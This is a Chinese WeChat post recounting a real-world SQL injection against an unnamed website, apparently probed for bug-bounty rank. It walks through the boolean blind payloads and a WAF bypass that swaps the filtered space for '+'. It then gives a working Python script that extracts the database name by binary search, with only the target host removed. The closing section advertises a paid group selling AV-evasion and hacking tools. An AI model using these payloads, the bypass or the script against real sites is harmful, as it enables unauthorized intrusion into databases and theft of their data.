#  实战 | 某站点的SQL注入漏洞过程   
 渗透安全团队   2023-11-23 23:22  
  
前言  
  
  
在页面参数增加 and -1=-1，页面回显正常这里如果 and 1=1 会被拦截  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUs4VzAkkNPlkp11Jce8YicyW0Posl60UEDoyKb2Ga2ibibHQFoVPpbRDYdg/640?wx_fmt=png&from=appmsg "")  
  
然后尝试-1=-2页面报错，此处存在数字型sql注入漏洞![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUsMGzEjVMt1opyjWvYbiaicNqAC1sklanYnZNvs35KtCPgS02aAYBKicq6g/640?wx_fmt=png&from=appmsg "")  
  
  
接下来就是查字段数order by 1页面依旧报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUsyPxu0Zsv1JB1ngzLaicRia1ibghA8D2QCB9xAcoANDdJgaFfC08LN2xVA/640?wx_fmt=png&from=appmsg "")  
  
如果大家在渗透的时候遇到这种情况要考虑是不是某些参数被拦截等  
  
换一种思路，用盲注的思路走走看不要到这里就直接放弃觉得怎么现在还能存在数字型的注入漏洞这样好歹能在edu赚点rank换个证书  
  
and length(database()) > 1,页面正常  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUsiaKEp8RJH4l5MRBQDHlvydjWCgC696s70P1QxL9nyd1h7Dw5NWusBMQ/640?wx_fmt=png&from=appmsg "")  
  
`and length(database())>10,页面报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUss431Rdyh0icBbrxibUSvRBYia1m5p7p7bCNLgDWSIFsctbufsBV5lvwRg/640?wx_fmt=png&from=appmsg "")  
  
这里是属于布尔盲注接下来就是用2分法找到长度最后测试结果是6然后测试一下能不能爆库名字符  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUsjtb3vx0OzticJiaKgvycTQknBd2CdUjAV3ibOhiagEsUqwe1qiahNiaI4OPQ/640?wx_fmt=png&from=appmsg "")  
  
然后再试试表名如果表名字符也能出这里数据也就能爆出来了因为查表名的时候，表名就是从数据表中查询出来的结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUsCK963xhdYyZwHoJ7jaEg4cF5wZy3LHrshBDvMpx0DwXMoqp0urpkpw/640?wx_fmt=png&from=appmsg "")  
  
这里经过多次尝试确认了过滤的内容是from%20 # %20就是空格然后试着用%09,%0a,%0b,%0c等绕过都不可行当我想要放弃的时候一位学长跟我说用加号试试我当时心里其实是非常不相信的，因为+在url编码里面就是空格的意思，那空格被过滤了，+不也就被禁掉了吗然后我出于礼貌的尝试了一下发现成了，，，所以还是谦虚一点好  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUsReZW99vhgBcgFUianXoEhaCHOe2skP02OGxpzhgL2uj0TicLPHyan5lA/640?wx_fmt=png&from=appmsg "")  
  
这里至少没有被waf拦截然后再继续尝试  
  
这里的话把where语句去掉之后就可行了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcpo8JQc6SkzKBu17lGicnzUsgMgmHtLLJx2qhhVIIhfU9F9EbtYPnZTUUyhYWLoUg6BnubLQeKKgUA/640?wx_fmt=png&from=appmsg "")  
  
然后写一个脚本去跑脚本这里的话网址都删掉了，可以看看编写思路这里用正则表达式，去看页面内容中是否存在发布时间这几个字符存在的话就说明页面为True不存在就是False然后用了二分法二分法的话可以参考我的这篇文章https://bbs.zkaq.cn/t/5506.html  
```
# coding=gbk
import requests
import re


def isTrue(url):
    res = requests.get(url)
    if re.search("发布时间", res.text):
        return True


def get_length():
    for i in range(25):
        url = f"http://网址/site/article.php?cate=5&cid=1&aid=972%20and%20length(database())={i}"
        if isTrue(url):
            print(f"length: {i}")
            return i


def to_num1(url, num=1):
    # url >
    if isTrue(url % num):
        return to_num1(url, num * 2)
    return [(num // 2) - 1, num]


def tow_num2(url, num_):

    c = (num_[1] + num_[0]) / 2
    if isTrue(url % c):  # 如果 大于 c成立 把最小值设置为中值
        # print(url % c)
        num_[0] = c
    else:
        num_[1] = c  # 否则设置最大值
    if num_[1] - num_[0] <= 1:
        num_[1] = round(num_[1])
        return num_[1]
    return tow_num2(url, [num_[0], num_[1]])


def get_database():
    database_name = ''
    for i in range(1, get_length() + 1):
        url = f"http://网址/site/article.php?cate=5&cid=1&aid=972 and ascii(substr(database(),{i},1))>%d"
        num1 = to_num1(url)
        num2 = tow_num2(url,num1)
        database_name += chr(num2)
    print("database:" + database_name)


if __name__ == '__main__':
    get_database()
```  
  
申  
明  
：  
本  
公  
众  
号  
所  
分  
享  
内  
容  
仅  
用  
于  
网  
络  
安  
全  
技  
术  
讨  
论  
，  
切  
勿  
用  
于  
违  
法  
途  
径  
，  
  
所  
有  
渗  
透  
都  
需  
获  
取  
授  
权  
，  
违  
者  
后  
果  
自  
行  
承  
担  
，  
与  
本  
号  
及  
作  
者  
无  
关  
，  
请  
谨  
记  
守  
法  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8CKksEIzZyEb3tEFGzGYSXfribrG4jKOkRKGKYb7zk7MTNZPT6Wp3bLd2BPhuFHddIL6sqrg1d2qHQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8D0bS8ibc3XhFcDYkVusFvc3c6onthQpPGZn4v32rpOp7CeFiamGdeC7JBk0mGVsiciazLp3z0SIJAtnQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  

								[                ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			                  
  
  
**关 注 有 礼**  
  
  
  
关注下方公众号回复“  
666  
”可以领取一套领取黑客成长秘籍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**推荐阅读**  
  
  
  
[干货｜史上最全一句话木马](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[干货 | CS绕过vultr特征检测修改算法](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[实战 | 用中国人写的红队服务器搞一次内网穿透练习](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[实战 | 渗透某培训平台经历](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[实战 | 一次曲折的钓鱼溯源反制](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
